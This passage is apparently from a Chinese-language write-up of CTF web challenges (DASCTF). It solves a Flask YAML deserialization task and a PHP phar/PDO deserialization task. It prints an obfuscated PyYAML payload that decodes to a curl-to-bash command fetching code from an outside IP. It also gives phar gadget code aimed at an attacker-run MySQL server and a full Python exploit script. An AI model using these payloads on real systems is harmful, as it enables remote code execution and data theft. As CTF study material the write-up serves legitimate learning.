class="string">&#x27;/Yam1&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Yam1</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;uploads/<span class="subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_content = f.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> waf(file_content):</span><br><span class="line">            test = yaml.load(file_content)</span><br><span class="line">            <span class="built_in">print</span>(test)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;welcome&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>看到有yaml.load函数想到yaml反序列化,没有过滤掉exec，但是没有回显，所以需要弹个shell出来<br>但是存在一些黑名单过滤，这里学到一招用bytes进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;curl http://47.101.63.120/1.txt|bash&quot;)&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;exec(bytes([[j][0]for(i)in[range(<span class="subst">&#123;<span class="built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="string">&quot;]]or[&quot;</span>.join([<span class="string">f&quot;i]in[[<span class="subst">&#123;i&#125;</span>]]and[j]in[[<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(exp)]) + <span class="string">&quot;]]]))&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">type</span></span><br><span class="line">args:</span><br><span class="line">  - exp</span><br><span class="line">  - !!python/<span class="built_in">tuple</span> []</span><br><span class="line">  - &#123;<span class="string">&quot;extend&quot;</span>: !!python/name:<span class="built_in">exec</span> &#125;</span><br><span class="line">listitems: <span class="string">&quot;exec(bytes([[j][0]for(i)in[range(63)][0]for(j)in[range(256)][0]if[i]in[[0]]and[j]in[[95]]or[i]in[[1]]and[j]in[[95]]or[i]in[[2]]and[j]in[[105]]or[i]in[[3]]and[j]in[[109]]or[i]in[[4]]and[j]in[[112]]or[i]in[[5]]and[j]in[[111]]or[i]in[[6]]and[j]in[[114]]or[i]in[[7]]and[j]in[[116]]or[i]in[[8]]and[j]in[[95]]or[i]in[[9]]and[j]in[[95]]or[i]in[[10]]and[j]in[[40]]or[i]in[[11]]and[j]in[[34]]or[i]in[[12]]and[j]in[[111]]or[i]in[[13]]and[j]in[[115]]or[i]in[[14]]and[j]in[[34]]or[i]in[[15]]and[j]in[[41]]or[i]in[[16]]and[j]in[[46]]or[i]in[[17]]and[j]in[[115]]or[i]in[[18]]and[j]in[[121]]or[i]in[[19]]and[j]in[[115]]or[i]in[[20]]and[j]in[[116]]or[i]in[[21]]and[j]in[[101]]or[i]in[[22]]and[j]in[[109]]or[i]in[[23]]and[j]in[[40]]or[i]in[[24]]and[j]in[[34]]or[i]in[[25]]and[j]in[[99]]or[i]in[[26]]and[j]in[[117]]or[i]in[[27]]and[j]in[[114]]or[i]in[[28]]and[j]in[[108]]or[i]in[[29]]and[j]in[[32]]or[i]in[[30]]and[j]in[[104]]or[i]in[[31]]and[j]in[[116]]or[i]in[[32]]and[j]in[[116]]or[i]in[[33]]and[j]in[[112]]or[i]in[[34]]and[j]in[[58]]or[i]in[[35]]and[j]in[[47]]or[i]in[[36]]and[j]in[[47]]or[i]in[[37]]and[j]in[[52]]or[i]in[[38]]and[j]in[[55]]or[i]in[[39]]and[j]in[[46]]or[i]in[[40]]and[j]in[[49]]or[i]in[[41]]and[j]in[[48]]or[i]in[[42]]and[j]in[[49]]or[i]in[[43]]and[j]in[[46]]or[i]in[[44]]and[j]in[[54]]or[i]in[[45]]and[j]in[[51]]or[i]in[[46]]and[j]in[[46]]or[i]in[[47]]and[j]in[[49]]or[i]in[[48]]and[j]in[[50]]or[i]in[[49]]and[j]in[[48]]or[i]in[[50]]and[j]in[[47]]or[i]in[[51]]and[j]in[[49]]or[i]in[[52]]and[j]in[[46]]or[i]in[[53]]and[j]in[[116]]or[i]in[[54]]and[j]in[[120]]or[i]in[[55]]and[j]in[[116]]or[i]in[[56]]and[j]in[[124]]or[i]in[[57]]and[j]in[[98]]or[i]in[[58]]and[j]in[[97]]or[i]in[[59]]and[j]in[[115]]or[i]in[[60]]and[j]in[[104]]or[i]in[[61]]and[j]in[[34]]or[i]in[[62]]and[j]in[[41]]]))&quot;</span></span><br></pre></td></tr></table></figure><p>然后访问 路由Yam1?filename=上传的文件名</p><h4 id="strange-php">strange_php</h4><p>入口处</p><img src="/post/639d78a4/IMAGE20250226205744372.png" class=""><p>这里是可以为我们所控制写入任意内容的，会写入到一个文件中。</p><img src="/post/639d78a4/IMAGE20250226205840580.png" class=""><img src="/post/639d78a4/IMAGE20250226205852518.png" class=""><p>能够想到phar反序列化。接下来去看利用点</p><img src="/post/639d78a4/IMAGE20250226205939720.png" class=""><p>可以读取任意文件，所以要找到如何触发_set魔术方法</p><img src="/post/639d78a4/IMAGE20250226210031363.png" class=""><p>在PDO_connect类中的init方法中，如果我们将ATTR_DEFAULT_FETCH_MODE指定为<code>262152</code>，就可以将结果的第一列做为类名， 然后新建一个实例，在初始化属性值时，sql的列名就对应者类的属性名，如果存在某个列名，但在该类中不存在这个属性名，在赋值时就会触发类的_set方法。</p><p>这里提到的 <code>262152</code> 实际上是 <code>PDO::FETCH_CLASS | PDO::FETCH_PROPS_LATE</code> 的组合值（<code>PDO::FETCH_CLASS</code> 的值是 262144，<code>PDO::FETCH_PROPS_LATE</code> 的值是 8）</p><ul><li>当<code>ATTR_DEFAULT_FETCH_MODE</code>设置为<code>PDO::FETCH_CLASS | PDO::FETCH_PROPS_LATE</code>(262152) 时，PDO 会执行以下步骤：<ol><li>从结果集中读取一行数据。</li><li>将该行数据的第一列的值作为类名。</li><li>使用该类名创建一个新的实例（通过 <code>new $className</code>）。</li><li>调用该实例的构造函数。</li><li>遍历结果集的剩余列，将列名作为属性名，列值作为属性值，并尝试将这些值赋给该实例的属性。</li></ol></li></ul><p>因此我们可以在数据库新建一个UserMessage表，并且更改filePath的值，再加上一个不存在的变量(password)，即可触发<code>__set</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;UserMessage&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$created_at</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title class_">PDO_connect</span>();<span class="comment">//连续触发多个类的反序列化</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDO_connect</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$con_options</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;dsn&quot;</span>=&gt;<span class="string">&quot;mysql:host=47.101.63.120:3306;dbname=users;charset=utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;host&#x27;</span>=&gt;<span class="string">&#x27;47.101.63.120&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;port&#x27;</span>=&gt;<span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>=&gt;<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>=&gt;<span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;charset&#x27;</span>=&gt;<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;options&#x27;</span>=&gt;<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="number">262152</span>,</span><br><span class="line"></span><br><span class="line">            PDO::<span class="variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>)</span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$smt</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pdo</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;ppppp.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;happy.txt&quot;</span>, <span class="string">&#x27;happy&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;ppppp.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file_contents</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要找一个可以触发连接的方法在user.php中的log方法就存在</p><img src="/post/639d78a4/IMAGE20250226210517965.png" class=""><p>在创建一个恶意的mysql服务器就可以打了。</p><p>参考：<br><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p>看看官方的wp是利用sqlite数据库都一样其实</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">PDO_connect</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$pdo</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$con_options</span> = [];<span class="comment">//use to set options of PDO connections</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$smt</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;con_options = [<span class="string">&quot;dsn&quot;</span>=&gt;<span class="string">&#x27;sqlite:/var/www/html/f856faaf1f24eddf7cbfd0690ff93068.txt&#x27;</span>,<span class="string">&quot;username&quot;</span>=&gt;<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;options&quot;</span>=&gt;[PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="variable constant_">FETCH_CLASS</span>|PDO::<span class="variable constant_">FETCH_CLASSTYPE</span>,]];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title class_">PDO_connect</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;UserMessage&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;aaaaaaaaaaaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r&quot;[0-9a-f]&#123;32&#125;\.txt&quot;</span></span><br><span class="line">sear = re.<span class="built_in">compile</span>(pattern)</span><br><span class="line">headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">           <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Microsoft Edge\&quot;;v=\&quot;125\&quot;, \&quot;Chromium\&quot;;v=\&quot;125\&quot;, \&quot;Not.A/Brand\&quot;;v=\&quot;24\&quot;&quot;</span>,</span><br><span class="line">           <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://localhost:1919&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>, <span class="string">&quot;Sec-Fetch-User&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;document&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://localhost:1919/welcome.php&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_db</span>(<span class="params">db_path</span>):</span><br><span class="line">    conn = sqlite3.connect(db_path)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        username TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        filePath TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        password TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        id INTEGER PRIMARY KEY AUTOINCREMENT</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    users = [</span><br><span class="line">        (<span class="string">&#x27;UserMessage&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>),</span><br><span class="line">    ]</span><br><span class="line">    cursor.executemany(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    INSERT INTO users (username, password,filePath) VALUES (?,?,?)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, users)</span><br><span class="line"></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">&#x27;SELECT * FROM users&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_file_to_base64</span>(<span class="params">input_file_path</span>):</span><br><span class="line"></span><br><span class="line">    binary_data = <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    base64_encoded_data = base64.b64encode(binary_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> base64_encoded_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_phar</span>(<span class="params">filename</span>):</span><br><span class="line">    code = <span class="built_in">open</span>(<span class="string">&#x27;exp.php&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    result = re.sub(sear, filename, code)</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    php_file = <span class="string">&quot;1.php&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(php_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(result)</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;php&#x27;</span>, php_file], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">19</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">url,file_path</span>):</span><br><span class="line"></span><br><span class="line">    res = session.post(url+<span class="string">&quot;welcome.php&quot;</span>, data=file_path)</span><br><span class="line">    file_data = encode_file_to_base64(file_path)</span><br><span class="line">    <span class="comment"># file_data = quote(file_data)</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;encodedMessage&quot;</span>:file_data,</span><br><span class="line">                  <span class="string">&quot;1&quot;</span>:<span class="string">&quot;1&quot;</span>,&#125;</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>welcome.php&quot;</span>, data=burp0_data, headers=headers,)</span><br><span class="line">    msg = sear.findall(r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phar_triger</span>(<span class="params">url,file_path</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;message_path&quot;</span>: file_path&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/welcome.php&quot;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#url = &quot;http://%s:%s/&quot;% (ip, port,)</span></span><br><span class="line">    username = generate_random_string()</span><br><span class="line">    password = generate_random_string()</span><br><span class="line">    target1 = url + <span class="string">&quot;/main.php?action=register&quot;</span></span><br><span class="line">    target2 = url + <span class="string">&quot;/main.php?action=login&quot;</span></span><br><span class="line">    res1 = session.post(target1, data=&#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line">    res2 = session.post(target2, data=&#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line">    db_path = generate_random_string()</span><br><span class="line">    gen_db(db_path)</span><br><span class="line">    txt_name = write_file(url, db_path)</span><br><span class="line"></span><br><span class="line">    gen_phar(txt_name)</span><br><span class="line">    txt_name_phar = write_file(url, <span class="string">&quot;shell.phar&quot;</span>)</span><br><span class="line">    phar_filename = <span class="string">&quot;phar:///var/www/html/txt/&quot;</span> + txt_name_phar</span><br><span class="line">    phar_triger(url, phar_filename.replace(<span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    target_file = hashlib.md5(<span class="string">&quot;/flag&quot;</span>.encode()).hexdigest() + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">    res_exp = session.get(url + <span class="string">&quot;/log/&quot;</span> + target_file)</span><br><span class="line">    match_group = re.findall(<span class="string">&quot;DASCTF&#123;(.*?)&#125;&quot;</span>, r.text)</span><br><span class="line">    flag = match_group[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span 